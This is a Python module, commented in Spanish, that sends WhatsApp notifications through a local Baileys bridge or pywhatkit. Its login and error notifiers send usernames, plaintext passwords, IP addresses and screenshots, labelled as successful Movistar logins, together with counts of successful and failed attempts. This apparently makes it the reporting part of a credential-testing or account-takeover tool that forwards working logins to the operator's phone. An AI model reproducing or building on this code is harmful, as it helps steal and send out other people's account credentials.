"""
Módulo de Notificaciones WhatsApp (Python Client)
==================================================
Cliente Python que se conecta al bridge de Baileys (Node.js)
via HTTP localhost para enviar notificaciones.

Opciones de configuración:
1. WhatsApp vía Baileys Bridge (recomendado, multimedia)
2. WhatsApp vía pywhatkit (fallback, solo texto, abre navegador)
"""

import logging
import requests
import json
import subprocess
import time
import os
import signal
from pathlib import Path
from typing import Optional, List, Dict

logger = logging.getLogger(__name__)


class WhatsAppNotifier:
    """Cliente de notificaciones WhatsApp."""

    def __init__(self, bridge_port: int = 3456, whatsapp_module_dir: str = None):
        self.bridge_url = f"http://localhost:{bridge_port}"
        self.bridge_port = bridge_port
        self.whatsapp_module_dir = Path(whatsapp_module_dir) if whatsapp_module_dir else None
        self.bridge_process = None
        self.connected = False

    def start_bridge(self, phone_numbers: List[str] = None, wait_timeout: int = 60) -> bool:
        """
        Inicia el bridge de Baileys como proceso Node.js.

        Args:
            phone_numbers: Lista de números WhatsApp destino
            wait_timeout: Segundos máximos de espera para conexión

        Returns:
            True si el bridge se inició correctamente
        """
        if not self.whatsapp_module_dir:
            logger.error("Directorio del módulo WhatsApp no configurado")
            return False

        bridge_script = self.whatsapp_module_dir / "whatsapp_bridge.mjs"
        if not bridge_script.exists():
            logger.error(f"No se encontró: {bridge_script}")
            return False

        # Verificar dependencias de Node.js
        node_modules = self.whatsapp_module_dir / "node_modules"
        if not node_modules.exists():
            logger.info("Instalando dependencias de WhatsApp...")
            try:
                subprocess.run(
                    ["npm", "install"],
                    cwd=str(self.whatsapp_module_dir),
                    capture_output=True, timeout=120
                )
            except Exception as e:
                logger.error(f"Error instalando dependencias: {e}")
                return False

        # Construir comando
        cmd = ["node", str(bridge_script)]
        if phone_numbers:
            phones_str = ",".join(phone_numbers)
            cmd.append(f"--phone={phones_str}")

        # Crear archivo de config con números
        if phone_numbers:
            config_file = self.whatsapp_module_dir / "whatsapp_config.json"
            with open(config_file, "w") as f:
                json.dump({"target_numbers": phone_numbers}, f)

        # Iniciar proceso
        logger.info(f"Iniciando WhatsApp Bridge en puerto {self.bridge_port}...")
        try:
            self.bridge_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=str(self.whatsapp_module_dir),
                preexec_fn=os.setsid if os.name == 'posix' else None
            )
            logger.info(f"Bridge PID: {self.bridge_process.pid}")

            # Esperar a que esté listo
            start_time = time.time()
            while time.time() - start_time < wait_timeout:
                try:
                    resp = requests.get(f"{self.bridge_url}/status", timeout=3)
                    status = resp.json()
                    self.connected = status.get("connected", False)

                    if self.connected:
                        logger.info("✅ WhatsApp Bridge conectado y listo")
                        return True
                    else:
                        logger.info("⏳ Bridge iniciado, esperando escaneo de QR...")
                        return True  # Bridge corriendo pero necesita QR scan

                except requests.ConnectionError:
                    time.sleep(2)
                except Exception as e:
                    logger.warning(f"Verificando estado: {e}")
                    time.sleep(2)

            logger.warning("Timeout esperando bridge")
            return True  # El proceso sigue, quizás necesita QR

        except Exception as e:
            logger.error(f"Error iniciando bridge: {e}")
            return False

    def stop_bridge(self):
        """Detiene el bridge de Baileys."""
        try:
            # Enviar shutdown
            requests.post(f"{self.bridge_url}/shutdown", timeout=5)
        except Exception:
            pass

        # Matar proceso
        if self.bridge_process:
            try:
                if os.name == 'posix':
                    os.killpg(os.getpgid(self.bridge_process.pid), signal.SIGTERM)
                else:
                    self.bridge_process.terminate()
                self.bridge_process.wait(timeout=10)
            except Exception:
                try:
                    self.bridge_process.kill()
                except Exception:
                    pass
            self.bridge_process = None

        self.connected = False
        logger.info("Bridge detenido")

    def _post(self, endpoint: str, data: dict) -> bool:
        """Envía un POST al bridge."""
        try:
            resp = requests.post(f"{self.bridge_url}{endpoint}", json=data, timeout=15)
            result = resp.json()
            if resp.status_code == 200:
                return True
            else:
                logger.warning(f"Error en {endpoint}: {result.get('error', 'unknown')}")
                return False
        except requests.ConnectionError:
            logger.warning("Bridge no disponible - ¿está corriendo?")
            return False
        except Exception as e:
            logger.error(f"Error enviando notificación: {e}")
            return False

    def get_status(self) -> dict:
        """Obtiene el estado del bridge."""
        try:
            resp = requests.get(f"{self.bridge_url}/status", timeout=5)
            return resp.json()
        except Exception:
            return {"connected": False, "error": "bridge_offline"}

    def add_number(self, number: str) -> bool:
        """Agrega un número destino en runtime."""
        return self._post("/add-number", {"number": number})

    def send_message(self, number: str, text: str) -> bool:
        """Envía un mensaje de texto."""
        return self._post("/send", {"number": number, "text": text})

    def notify_login(self, procedencia: str, usuario: str, contraseña: str,
                    screenshot: str = None, ip: str = "N/A") -> bool:
        """Envía notificación de login exitoso con captura."""
        data = {
            "procedencia": procedencia,
            "usuario": usuario,
            "contraseña": contraseña,
            "screenshot": screenshot,
            "ip": ip
        }
        return self._post("/notify-login", data)

    def notify_error(self, procedencia: str, usuario: str, contraseña: str,
                    error: str, ip: str = "N/A") -> bool:
        """Envía notificación de error."""
        data = {
            "procedencia": procedencia,
            "usuario": usuario,
            "contraseña": contraseña,
            "error": error,
            "ip": ip
        }
        return self._post("/notify-error", data)

    def notify_summary(self, total: int, exitosos: int, fallidos: int, duration: str) -> bool:
        """Envía resumen de la ejecución."""
        return self._post("/notify-summary", {
            "total": total,
            "exitosos": exitosos,
            "fallidos": fallidos,
            "duration": duration
        })


# ===== FALLBACK: pywhatkit (solo texto, abre navegador) =====
class WhatsAppFallback:
    """Fallback usando pywhatkit (envía vía navegador web de WhatsApp)."""

    def __init__(self, country_code: int = 51):
        self.country_code = country_code

    def send_message(self, phone: str, message: str, wait_time: int = 15) -> bool:
        """Envía mensaje usando pywhatkit."""
        try:
            import pywhatkit as kit
            kit.sendwhatmsg_instantly(
                phone=f"+{self.country_code}{phone}",
                msg=message,
                wait_time=wait_time,
                tab_close=True,
                close_after_wait=wait_time + 5
            )
            return True
        except ImportError:
            logger.error("pywhatkit no instalado. Instalar con: pip install pywhatkit")
            return False
        except Exception as e:
            logger.error(f"Error con pywhatkit: {e}")
            return False

    def notify_login(self, procedencia: str, usuario: str, contraseña: str,
                    screenshot: str = None, ip: str = "N/A", phone: str = None) -> bool:
        if not phone:
            logger.error("Número de teléfono requerido para fallback")
            return False

        msg = (f"🔐 LOGIN EXITOSO - MOVISTAR\n\n"
               f"Procedencia: {procedencia}\n"
               f"Usuario: {usuario}\n"
               f"Contraseña: {contraseña}\n"
               f"IP: {ip}\n"
               f"Fecha: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        return self.send_message(phone, msg)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    notifier = WhatsAppNotifier(bridge_port=3456,
                                whatsapp_module_dir=str(Path(__file__).parent))

    # Test de conexión
    status = notifier.get_status()
    print(json.dumps(status, indent=2))

    if not status.get("connected"):
        print("\nIniciando bridge...")
        notifier.start_bridge(phone_numbers=["999999999"])  # Cambiar por tu número
        time.sleep(5)
        status = notifier.get_status()
        print(json.dumps(status, indent=2))

    notifier.stop_bridge()
